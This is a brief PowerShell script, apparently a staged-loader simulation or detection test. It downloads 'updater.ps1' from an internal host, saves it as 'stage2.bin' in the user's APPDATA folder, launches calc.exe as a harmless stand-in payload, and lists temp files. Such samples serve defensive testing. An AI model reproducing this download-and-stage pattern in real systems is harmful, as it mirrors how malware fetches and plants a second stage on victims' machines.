$TransferUrl = "http://internal.corp:80/updater.ps1"
$Stage2Path = "$env:APPDATA\stage2.bin"
Invoke-WebRequest -Uri $TransferUrl -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe"
$StageMarker = "stage-27"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
